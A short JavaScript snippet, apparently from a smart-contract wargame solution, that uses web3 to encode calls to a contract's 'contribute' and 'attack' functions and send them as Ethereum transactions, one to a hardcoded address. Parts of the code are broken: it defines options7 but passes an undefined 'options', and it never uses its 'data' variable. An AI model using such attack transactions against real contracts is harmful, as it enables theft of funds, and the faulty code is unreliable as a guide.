function functionData(contract, functionName, parameters){ 
    let abi = web3.eth.contract(contract.abi);
    let w3Contract = abi.at(contract.address);
    if (parameters != undefined){
        return w3Contract[functionName].getData(...parameters);
    } else {
        return w3Contract[functionName].getData();
    }
}

let data = functionData(contract, 'contribute');
let options7 = {to: instance, gas: 350000, value: toWei(0.0001)};
sendTransaction(options);
//finally paas this data parameter to send Transaction
//endTransaction({to:Contractaddress, from:Accountaddress, data: getData});

let data11 = functionData(contract, 'attack');
let options11 = {to: "0x1994c53FCf12C66Ea1B466FeA1c96A42Deb91fa4", gas: 350000, data: data11};
sendTransaction(options11);